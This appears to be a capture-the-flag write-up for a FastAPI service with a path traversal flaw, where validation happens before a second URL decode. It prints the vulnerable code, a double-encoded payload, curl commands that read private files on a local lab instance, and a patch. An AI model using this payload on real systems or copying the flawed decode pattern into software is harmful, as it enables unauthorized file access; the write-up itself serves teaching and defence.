# Double Vision — writeup

## Summary

- Stack: Python and FastAPI.
- Vulnerability: path traversal.
- Root cause: the path is validated after one URL decode but used after a second decode.
- Payload: `%252e%252e/private/<id>.txt`.
- Canonical exploit: [`jury/exploit.py`](../../tasks/round-2/double-vision/jury/exploit.py).

## Storage design

The service creates two directories:

```text
/tmp/document-vault/public
/tmp/document-vault/private
```

`POST /api/documents` stores a document under a random `<id>.txt` filename. `GET /api/index` exposes IDs and the `private` flag, but never document contents. Public documents are previewed through:

```text
GET /api/preview?name=<id>.txt
```

Publishing private IDs is intentional: the challenge is about crossing the directory boundary, not guessing random names.

## Vulnerable code

The handler checks `name` first:

```python
if ".." in name or name.startswith("/"):
    raise HTTPException(400, "invalid document name")
```

It then decodes the value again before using it:

```python
decoded_name = urllib.parse.unquote(name)
path = os.path.join(public_root, decoded_name)
content = Path(path).read_text(encoding="utf-8")
```

FastAPI and the ASGI server already decoded the query parameter once. The manual `unquote` changes the value after validation.

## Why double encoding works

The payload changes as follows:

```text
original request:    %252e%252e/private/ID.txt
HTTP/ASGI decoding:  %2e%2e/private/ID.txt
validation:          no literal ".." is present
urllib.unquote:      ../private/ID.txt
```

`os.path.join` produces:

```text
/tmp/document-vault/public/../private/ID.txt
```

The filesystem resolves `..` and opens the private file.

## Manual exploitation

Find a private document ID:

```bash
curl -s http://127.0.0.1:8000/api/index
```

Example:

```json
[{"id":"4b8320b29a58de17","private":true}]
```

Read it with a double-encoded traversal:

```bash
curl -s 'http://127.0.0.1:8000/api/preview?name=%252e%252e/private/4b8320b29a58de17.txt'
```

An ordinary `../` does not work because the first validation sees it and returns `400`.

## Canonical exploit

The exploit loads `/api/index`, selects private entries, requests each double-encoded path and prints all `content` values matching `[A-Z0-9]{32}`.

## Correct patch

Never validate one representation and open another. The simplest fix is to remove the second decode. A stronger fix validates the resolved path:

```python
candidate = (public_root / name).resolve()
public = public_root.resolve()

if candidate.parent != public:
    raise HTTPException(400, "invalid document name")
```

Only direct children of the public directory are valid in this service. The checker creates a public document and previews `<id>.txt`, so canonical path validation preserves the intended flow.

## Takeaway

The dangerous operation is not merely `os.path.join`; it is the mismatch between the value that was validated and the value passed to the filesystem. Normalize first, then enforce the boundary.
